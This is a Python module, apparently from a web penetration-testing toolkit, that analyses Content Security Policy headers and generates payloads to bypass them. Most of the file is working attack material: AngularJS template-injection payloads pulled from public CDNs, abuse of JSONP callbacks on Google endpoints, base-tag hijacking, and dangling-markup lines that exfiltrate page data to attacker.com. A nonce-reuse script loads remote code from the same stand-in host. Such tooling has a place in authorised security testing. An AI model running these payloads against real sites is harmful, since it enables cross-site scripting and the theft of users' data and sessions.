"""
Content Security Policy (CSP) bypass techniques.

Includes:
- AngularJS CSP bypass via CDN
- JSONP endpoint abuse
- Base tag injection
- Dangling markup
- Policy injection
- Trusted types bypass
"""

from dataclasses import dataclass, field
from typing import Iterator


@dataclass
class CSPBypass:
    """Generate CSP bypass payloads."""

    # Known CSP bypass CDN endpoints
    ANGULAR_CDNS = [
        "https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js",
        "https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.7/angular.js",
        "https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.min.js",
        "//cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js",
        "//ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.min.js",
    ]

    # Known JSONP endpoints for CSP bypass
    JSONP_ENDPOINTS = [
        "https://accounts.google.com/o/oauth2/revoke?callback=",
        "https://www.google.com/complete/search?client=chrome&q=hello&callback=",
        "https://cse.google.com/api?callback=",
        "https://www.googleapis.com/customsearch/v1?callback=",
    ]

    # Common whitelisted domains that might have exploitable endpoints
    COMMON_WHITELIST = [
        "*.google.com",
        "*.googleapis.com",
        "*.gstatic.com",
        "*.cloudflare.com",
        "cdnjs.cloudflare.com",
        "*.jsdelivr.net",
        "unpkg.com",
        "*.unpkg.com",
    ]

    csp_policy: str = ""
    allowed_sources: list[str] = field(default_factory=list)

    def parse_csp(self, csp_header: str) -> dict[str, list[str]]:
        """Parse CSP header into directives."""
        directives = {}
        for directive in csp_header.split(";"):
            directive = directive.strip()
            if not directive:
                continue
            parts = directive.split()
            if parts:
                name = parts[0].lower()
                values = parts[1:] if len(parts) > 1 else []
                directives[name] = values
        return directives

    def analyze_csp(self, csp_header: str) -> dict:
        """Analyze CSP for bypass opportunities."""
        directives = self.parse_csp(csp_header)
        analysis = {
            "has_unsafe_inline": False,
            "has_unsafe_eval": False,
            "has_nonce": False,
            "has_strict_dynamic": False,
            "allows_data": False,
            "allows_blob": False,
            "whitelisted_domains": [],
            "bypass_possible": False,
            "bypass_methods": [],
        }

        script_src = directives.get("script-src", directives.get("default-src", []))

        for value in script_src:
            if value == "'unsafe-inline'":
                analysis["has_unsafe_inline"] = True
                analysis["bypass_possible"] = True
                analysis["bypass_methods"].append("unsafe-inline allows direct script injection")

            elif value == "'unsafe-eval'":
                analysis["has_unsafe_eval"] = True
                analysis["bypass_methods"].append("unsafe-eval allows eval()/Function()")

            elif value.startswith("'nonce-"):
                analysis["has_nonce"] = True

            elif value == "'strict-dynamic'":
                analysis["has_strict_dynamic"] = True

            elif value.startswith("data:"):
                analysis["allows_data"] = True
                analysis["bypass_possible"] = True
                analysis["bypass_methods"].append("data: URI allows script injection")

            elif value.startswith("blob:"):
                analysis["allows_blob"] = True

            elif "*" in value or value in ["*", "https:", "http:"]:
                analysis["bypass_possible"] = True
                analysis["bypass_methods"].append(f"Wildcard {value} allows any script")

            else:
                # Check if it's a whitelisted domain with known bypasses
                domain = value.replace("https://", "").replace("http://", "")
                analysis["whitelisted_domains"].append(domain)

                # Check for known bypass domains
                bypass_domains = [
                    ("cdnjs.cloudflare.com", "AngularJS CSP bypass"),
                    ("ajax.googleapis.com", "AngularJS CSP bypass"),
                    ("*.google.com", "JSONP callback"),
                    ("accounts.google.com", "JSONP callback"),
                    ("www.google.com", "JSONP callback"),
                    ("unpkg.com", "Arbitrary package loading"),
                    ("cdn.jsdelivr.net", "Arbitrary package loading"),
                ]

                for bypass_domain, method in bypass_domains:
                    if bypass_domain.replace("*.", "") in domain or domain in bypass_domain:
                        analysis["bypass_possible"] = True
                        analysis["bypass_methods"].append(f"{domain}: {method}")

        return analysis

    def angular_csp_bypass(self, callback: str = "alert(1)") -> list[str]:
        """
        Generate AngularJS-based CSP bypass payloads.

        AngularJS versions < 1.6 allow CSP bypass using ng-app and expressions.
        """
        payloads = []

        # Basic AngularJS bypass
        for cdn in self.ANGULAR_CDNS:
            payloads.extend([
                # Client-side template injection
                f'<script src="{cdn}"></script><div ng-app ng-csp>{{{{$eval.constructor("{callback}")()}}}}</div>',

                # ng-click bypass
                f'<script src="{cdn}"></script><div ng-app ng-csp ng-click="$event.view.alert(1)">click</div>',

                # Using $on
                f'<script src="{cdn}"></script><div ng-app ng-csp>{{{{$on.constructor("{callback}")()}}}}</div>',

                # Orderby filter abuse
                f'<script src="{cdn}"></script><div ng-app ng-csp>{{{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}}}</div>',

                # Prototype-based
                f'<script src="{cdn}"></script><div ng-app ng-csp>{{{{a]constructor.prototype.charAt=[].join;$eval("x]"+"{callback}//");}}}}</div>',
            ])

        return payloads

    def jsonp_csp_bypass(self, callback: str = "alert") -> list[str]:
        """
        Generate JSONP-based CSP bypass payloads.

        If JSONP endpoints are whitelisted, we can use their callback parameter.
        """
        payloads = []

        for endpoint in self.JSONP_ENDPOINTS:
            # Direct callback
            payloads.append(f'<script src="{endpoint}{callback}"></script>')

            # With argument
            payloads.append(f'<script src="{endpoint}{callback}(1)//"></script>')

        return payloads

    def base_tag_bypass(self, attacker_server: str = "//attacker.com") -> list[str]:
        """
        Generate base tag hijacking payloads.

        If <base> tag is injectable, we can redirect relative script loads.
        """
        return [
            f'<base href="{attacker_server}/">',
            f'<base href="{attacker_server}/"><script src="/xss.js"></script>',
            f'<base href="{attacker_server}"><a href="/steal">click</a>',
        ]

    def dangling_markup(self) -> list[str]:
        """
        Generate dangling markup injection payloads.

        Used to exfiltrate data when script execution is blocked.
        """
        return [
            # Image-based exfil
            '<img src="https://attacker.com/steal?data=',
            '<img src="//attacker.com/x?',

            # Meta refresh
            '<meta http-equiv="refresh" content="0;url=https://attacker.com/?',

            # Link prefetch
            '<link rel=prefetch href="https://attacker.com/?',

            # Form action hijack
            '<form action="https://attacker.com/steal"><input name=data>',

            # CSS import
            '<style>@import "https://attacker.com/steal?data=',
        ]

    def nonce_reuse_bypass(self) -> list[str]:
        """
        Payloads that exploit nonce reuse or predictable nonces.
        """
        return [
            # If nonce is in DOM, extract and reuse
            '<script>var n=document.querySelector("[nonce]").nonce;'
            'var s=document.createElement("script");s.nonce=n;s.src="//attacker.com/x.js";'
            'document.body.appendChild(s)</script>',

            # DOM-based nonce extraction
            '<script nonce="">alert(1)</script>',  # Empty nonce might work
        ]

    def strict_dynamic_bypass(self) -> list[str]:
        """
        Bypass strict-dynamic CSP using script gadgets.

        strict-dynamic allows dynamically created scripts from trusted scripts.
        """
        return [
            # If we can inject into a trusted script's callback
            "');alert(1);//",

            # DOM XSS in existing trusted script
            "location.hash.slice(1)",

            # Using existing jQuery
            "$.globalEval('alert(1)')",

            # Script gadget in framework
            "angular.element(document).injector().get('$parse')('alert(1)')()",
        ]

    def generate_all_bypasses(
        self,
        csp_header: str = "",
        callback: str = "alert(1)"
    ) -> Iterator[str]:
        """Generate all applicable CSP bypass payloads."""

        analysis = self.analyze_csp(csp_header) if csp_header else {}

        # Always try these
        yield from self.angular_csp_bypass(callback)
        yield from self.jsonp_csp_bypass("alert")
        yield from self.base_tag_bypass()
        yield from self.dangling_markup()

        if analysis.get("has_nonce"):
            yield from self.nonce_reuse_bypass()

        if analysis.get("has_strict_dynamic"):
            yield from self.strict_dynamic_bypass()

    def get_bypass_for_policy(
        self,
        csp_header: str,
        max_payloads: int = 20
    ) -> list[str]:
        """Get targeted bypass payloads for a specific CSP policy."""
        payloads = list(self.generate_all_bypasses(csp_header))
        return payloads[:max_payloads]


def analyze_csp_header(csp_header: str) -> dict:
    """Convenience function to analyze CSP."""
    bypass = CSPBypass()
    return bypass.analyze_csp(csp_header)


def get_csp_bypass_payloads(csp_header: str = "", max_payloads: int = 30) -> list[str]:
    """Convenience function to get CSP bypass payloads."""
    bypass = CSPBypass()
    return list(bypass.generate_all_bypasses(csp_header))[:max_payloads]
